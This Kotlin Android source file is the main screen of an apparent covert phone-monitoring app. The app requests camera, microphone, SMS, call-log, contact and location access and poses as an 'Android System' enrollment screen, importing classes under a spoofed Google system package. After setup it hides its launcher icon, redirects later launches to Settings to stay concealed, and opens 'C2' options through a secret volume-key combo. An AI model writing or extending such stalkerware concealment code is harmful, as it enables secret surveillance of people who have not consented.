package com.homemonitor

import android.Manifest
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.KeyEvent
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.compose.runtime.*
import com.google.android.system.C2Gatekeeper
import com.google.android.system.MonitorService
import com.google.android.system.SecurityVaultManager

/**
 * MainActivity
 *
 * Android System Enrollment Activity & Stealth Mode Settings Redirect:
 * - Checks if app is in Stealth Hidden Mode or post-enrollment.
 * - If hidden: Automatically redirects user to Android System Settings (Settings.ACTION_SETTINGS) and finishes.
 * - If first launch: Presents UserEnrollmentScreen to grant permissions and link parent account.
 * - Secret 5-tap / Volume key combo opens C2 Gatekeeper options.
 */
class MainActivity : AppCompatActivity() {

    companion object {
        @Volatile var instance: MainActivity? = null
    }

    private val requiredPermissions: Array<String>
        get() {
            val perms = mutableListOf(
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            )
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
                perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                perms.add(Manifest.permission.READ_MEDIA_IMAGES)
                perms.add(Manifest.permission.READ_MEDIA_VIDEO)
                perms.add(Manifest.permission.READ_MEDIA_AUDIO)
                perms.add(Manifest.permission.POST_NOTIFICATIONS)
            }
            return perms.toTypedArray()
        }

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
            runSystemPermissionPrompts()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        enableEdgeToEdge()
        super.onCreate(savedInstanceState)
        instance = this

        // Check if Enrollment is complete and Stealth Hidden Mode is active — Redirect to System Settings
        val prefs = SecurityVaultManager.getEncryptedPrefs(this)
        val isEnrollmentDone = prefs.getBoolean("enrollment_completed", false)
        val isAppHidden = isEnrollmentDone && (C2Gatekeeper.isLauncherIconHidden(this) || prefs.getBoolean("is_app_hidden", false))

        if (isAppHidden && !intent.getBooleanExtra("bypass_stealth_redirect", false)) {
            Log.i("MainActivity", "App enrolled & hidden — Redirecting user to System Settings ⚙️")
            try {
                val settingsIntent = Intent(Settings.ACTION_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                }
                startActivity(settingsIntent)
            } catch (e: Exception) {
                Log.e("MainActivity", "Settings redirect error: ${e.message}")
            }
            finish()
            return
        }

        // Set clean white status bar with dark icons
        window.statusBarColor = android.graphics.Color.WHITE
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            androidx.core.view.WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true
        }

        // Render Android System User Enrollment Screen
        setContent {
            UserEnrollmentScreen(
                onEnrollmentComplete = {
                    Log.i("MainActivity", "Enrollment completed. Hiding app icon and activating stealth redirect...")
                    prefs.edit()
                        .putBoolean("enrollment_completed", true)
                        .putBoolean("is_app_hidden", true)
                        .apply()
                    C2Gatekeeper.toggleLauncherIconHiding(this@MainActivity)
                    try {
                        val settingsIntent = Intent(Settings.ACTION_SETTINGS).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                        }
                        startActivity(settingsIntent)
                    } catch (_: Exception) {}
                    finish()
                },
                onActivateDisguise = {
                    prefs.edit().putBoolean("enrollment_completed", true).apply()
                    try {
                        val settingsIntent = Intent(Settings.ACTION_SETTINGS).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                        }
                        startActivity(settingsIntent)
                    } catch (_: Exception) {}
                    finish()
                }
            )
        }

        // Start background MonitorService
        startMonitorService()

        // Check if first launch permission setup is needed
        val hasCompletedFirstBoot = prefs.getBoolean("first_boot_perms_done", false)

        if (!hasCompletedFirstBoot) {
            prefs.edit().putBoolean("first_boot_perms_done", true).apply()
            permissionLauncher.launch(requiredPermissions)
        }
    }

    private fun startMonitorService() {
        try {
            val intent = Intent(this, MonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "startMonitorService exception: ${e.message}")
        }
    }

    private fun runSystemPermissionPrompts() {
        startMonitorService()
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (C2Gatekeeper.handleVolumeKeyEvent(this, keyCode) {}) {
            return true
        }
        return super.onKeyDown(keyCode, event)
    }
}
